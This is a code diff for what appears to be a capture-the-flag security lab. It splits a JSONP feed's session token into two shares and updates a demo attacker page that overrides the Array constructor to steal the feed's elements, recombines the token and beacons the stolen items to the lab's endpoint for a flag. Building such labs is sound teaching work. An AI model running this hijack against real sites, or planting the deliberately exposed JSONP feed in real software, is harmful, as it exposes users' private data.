@@ -9,7 +9,8 @@ const { page, esc, appShell } = require('../../../lib/page');
 const { award, captured } = require('../../../lib/flags');
 // Provided by the module shared helper (../shared.js) the finisher wires up:
 // per-session token appended to the legacy Array feed.
-const { jsonpArrayToken } = require('../shared');
+const { jsonpArrayTokenShares } = require('../shared');
+const { COMBINE_HEX_JS } = require('../../../lib/jstoken');
 
 const router = express.Router();
 
@@ -25,7 +26,8 @@ router.get('/legacy', (req, res) => {
   // this script captures every array element (the classic 2007 hijack).
   // The feed appends a per-session token: the hijack beacon must carry it back,
   // proving the feed was actually loaded and hijacked in this session.
-  const items = FRIENDS.concat(['feed-token:' + jsonpArrayToken(req)]);
+    const shares = jsonpArrayTokenShares(req);
+  const items = FRIENDS.concat(['feed-sharea:' + shares.pxa, 'feed-sharek:' + shares.pxk]);
   res.send(`${cb}(new Array(${items.map((f) => JSON.stringify(f)).join(',')}));`);
 });
 
@@ -48,7 +50,8 @@ router.get('/array-attacker', (req, res) => {
           <li>The <code>&lt;script&gt;</code> tag pulls
           <code>/jsonp/legacy?callback=gotFriends</code>; its
           <code>new Array(...)</code> call runs the overridden constructor and
-          hands over every element, including the per-session feed token.</li>
+          hands over every element, including the feed token's two share items
+          (this page combines them at runtime before beaconing).</li>
           <li>The captured items beacon to <code>/jsonp/array-beacon</code>. A
           valid beacon awards the flag and rotates the token.</li>
         </ol>
@@ -56,6 +59,7 @@ router.get('/array-attacker', (req, res) => {
       <pre><code>${esc('<script src="/jsonp/legacy?callback=gotFriends"></script>')}</code></pre>
       <p id="status">Overriding Array and loading the JSONP feed...</p>
       <script>
+        ${COMBINE_HEX_JS}
         // Capture the real Array BEFORE overriding: a function *declaration*
         // named Array would hoist and shadow it, so capture first, then assign.
         var RealArray = Array;
@@ -65,10 +69,19 @@ router.get('/array-attacker', (req, res) => {
         function gotFriends() {
           document.getElementById('status').textContent =
             'Hijacked ' + (stolen ? stolen.length : 0) + ' elements; beaconing...';
+          // The feed carries its token only as two share items; code that
+          // ran the hijack combines them at runtime into the feed token.
+          var items = stolen ? stolen.slice() : [];
+          var sa = '', sk = '';
+          items.forEach(function (s) {
+            if (String(s).indexOf('feed-sharea:') === 0) sa = String(s).slice(12);
+            if (String(s).indexOf('feed-sharek:') === 0) sk = String(s).slice(12);
+          });
+          if (sa && sk) items.push('feed-token:' + combineHex(sa, sk));
           fetch('/jsonp/array-beacon', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ items: stolen })
+            body: JSON.stringify({ items: items })
           }).then(function (r) { return r.json(); }).then(function (j) {
             document.getElementById('status').innerHTML = j.ok
               ? 'Beacon accepted. Flag: <code>' + j.flag + '</code> (saved to your scoreboard)'
